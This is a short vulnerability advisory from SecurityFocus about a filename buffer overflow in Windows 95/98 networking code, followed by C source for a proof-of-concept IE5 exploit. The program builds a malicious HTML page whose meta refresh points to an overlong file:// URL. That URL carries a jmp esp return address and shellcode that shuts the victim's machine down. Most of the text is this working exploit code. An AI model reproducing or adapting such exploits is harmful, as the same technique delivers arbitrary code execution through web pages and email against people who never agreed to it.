source: http://www.securityfocus.com/bid/779/info
 
There is a overflowable buffer in the networking code for Windows 95 and 98 (all versions). The buffer is in the part of the code that handles filenames. By specifying an exceptionally long filename, an attacker can cause the machine to crash or execute arbitrary code. This vulnerability could be exploited remotely by including a hostile UNC or file:// URL in a web page or HTML email. The attack would occur when the page was loaded in a browser or the email was opened (including opening the email in a preview pane.) 

/*=========================================================================
   Microsoft IE5 for Windows98 exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =========================================================================
*/

#include    <stdio.h>
#include    <windows.h>

#define     MAXBUF          1000
#define     RETADR          53

/*
    jmp esp (FF E4) code is stored in this area.
    You must change this address for non-Japanese Windows98
*/
#define     EIP             0xbfb75a35 
                                         
unsigned char   exploit_code[200]={
0x43,0x43,0x43,0x43,0x43,0x53,0x53,0x53,
0xB8,0x2D,0x23,0xF5,0xBF,0x48,0x50,0xC3,
0x00
};

main(int argc,char *argv[])
{
    FILE                    *fp;
    unsigned int            ip;
    unsigned char           buf[MAXBUF];

    if (argc<2){
        printf("usage %s output_htmlfile\n",argv[0]);
        exit(1);
    }
    if ((fp=fopen(argv[1],"wb"))==NULL) return FALSE;   
    fprintf(fp,"<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=file://test/");
    
    memset(buf,0x41,MAXBUF);
    ip=EIP;
    buf[RETADR-1]=0x7f;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=( ip>>24)&0xff;
    memcpy(buf+80,exploit_code,strlen(exploit_code));
    buf[MAXBUF]=0;
    fprintf(fp,"%s/\">\n<HTML><B>",buf);
    fprintf(fp,"10 seconds later, this machine will be shut down.</B><BR><BR>");
    fprintf(fp,"If you are using IE5 for Japanese Windows98, ");
    fprintf(fp,"maybe, the exploit code which shuts down your machine will be executed.<BR>");
    fprintf(fp,"</HTML>\n");
    fclose(fp);
    printf("%s created.\n",argv[1]);
    return FALSE;
}